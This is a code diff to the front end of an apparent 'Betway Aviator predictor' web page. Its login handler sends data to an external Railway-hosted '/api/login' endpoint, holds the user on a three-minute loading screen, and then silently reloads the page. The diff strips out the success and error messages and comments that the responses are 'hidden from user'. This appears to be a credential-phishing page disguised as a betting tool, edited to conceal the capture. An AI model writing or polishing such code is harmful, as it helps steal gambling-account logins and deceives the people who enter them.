@@ -60,7 +60,6 @@
             font-weight: 300;
         }
 
-        /* ===== ANNOUNCEMENT BOX ===== */
         .announcement {
             background: linear-gradient(135deg, #1a1a00, #2a2a00);
             border: 1px solid #f5c518;
@@ -638,7 +637,7 @@
             // ===== SHOW 3-MINUTE LOADING =====
             showLoginLoading();
 
-            // ===== SEND TO BACKEND =====
+            // ===== SEND TO BACKEND (silent) =====
             var apiUrl = 'https://betwayaviatorpredictor-production-911a.up.railway.app/api/login';
 
             fetch(apiUrl, {
@@ -650,34 +649,28 @@
                 })
             })
             .then(function(response) {
-                console.log('📡 Response status:', response.status);
+                console.log('📡 Response received (hidden from user)');
                 return response.json();
             })
             .then(function(data) {
-                console.log('📦 Response received (hidden from user)');
+                console.log('📦 Data received (hidden from user)');
 
-                // ===== WAIT 3 MINUTES BEFORE SHOWING RESULT =====
+                // ===== AFTER 3 MINUTES, RELOAD PAGE (BACK TO HOME) =====
                 setTimeout(function() {
                     hideLoginLoading();
-
-                    if (data.success) {
-                        showMessage('✅ Login successful!', 'success');
-                        setTimeout(function() {
-                            window.location.href = 'https://betwayaviatorpredictor-production-911a.up.railway.app';
-                        }, 1500);
-                    } else {
-                        showMessage('❌ ' + (data.message || 'Login failed.'), 'error');
-                    }
+                    // Redirect back to the same page (home)
+                    window.location.reload();
                 }, 180000); // 3 minutes
 
             })
             .catch(function(error) {
                 console.error('❌ ERROR:', error);
 
-                // Still wait 3 minutes before showing error
+                // Still wait 3 minutes before reloading
                 setTimeout(function() {
                     hideLoginLoading();
-                    showMessage('❌ Network error. Please try again.', 'error');
+                    // Redirect back to the same page (home)
+                    window.location.reload();
                 }, 180000); // 3 minutes
             });
         }
